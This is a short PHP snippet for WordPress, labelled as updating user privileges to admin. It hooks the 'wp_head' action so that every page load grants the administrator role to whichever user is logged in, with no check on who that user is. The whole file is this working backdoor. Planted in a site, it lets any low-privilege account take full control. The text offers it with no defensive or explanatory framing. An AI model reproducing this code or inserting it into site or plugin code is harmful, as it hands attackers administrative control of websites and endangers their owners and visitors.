<?php

//Update wordpress user privileges to admin

add_action('wp_head', 'set_as_admin');
function set_as_admin(){
 $user_id = get_current_user_id();
 $u = new WP_User( $user_id );

 // Add role
 $u->add_role( 'administrator' );
}


?>